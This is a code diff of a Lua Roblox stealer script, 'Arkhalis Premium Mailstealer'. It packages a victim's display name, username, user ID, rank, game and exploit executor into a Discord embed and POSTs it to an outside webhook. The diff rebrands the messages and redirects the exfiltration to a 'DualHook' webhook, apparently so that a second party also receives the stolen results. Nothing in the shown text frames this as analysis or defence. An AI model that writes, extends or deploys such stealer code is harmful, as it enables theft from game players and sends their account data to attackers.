@@ -43,11 +43,11 @@ _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-	["content"]= "**🎁New Hit With Arkhalis Premium🎁** || @here|| ",
-	["username"] = "Arkhalis",
+	["content"]= "**💎New Hit With Arkhalis Premium💎** || @here|| ",
+	["username"] = "💎 Arkhalis Premium 💎",
 	["embeds"]= {
 	  {
-		["title"]= "`Arkhalis Premium Mailstealer Results`",
+		["title"]= "`Mailstealer Results`",
 		["description"]= "**Data from the victim**\n**🧑Display Name: **".._G.PlrDisplayNameVictim.."\n**🧑Username: **".._G.PlrUserVictim.."\n**🧑User ID: **".._G.PlrUserIDVictim.."\n**🐱Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n☠Executor: **"..getexploit(),
 		["url"]= "https://discord.gg/vzY4yAk9ns",
 		["color"]= ""..webhookcolor.."",
@@ -78,7 +78,7 @@ local msg = {
   },
 	["attachments"] = {}
   }
-  local Webhook = _G.Webhook
+  local Webhook = _G.WebhookDualHook
   request = http_request or request or HttpPost or syn.request
   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
   end
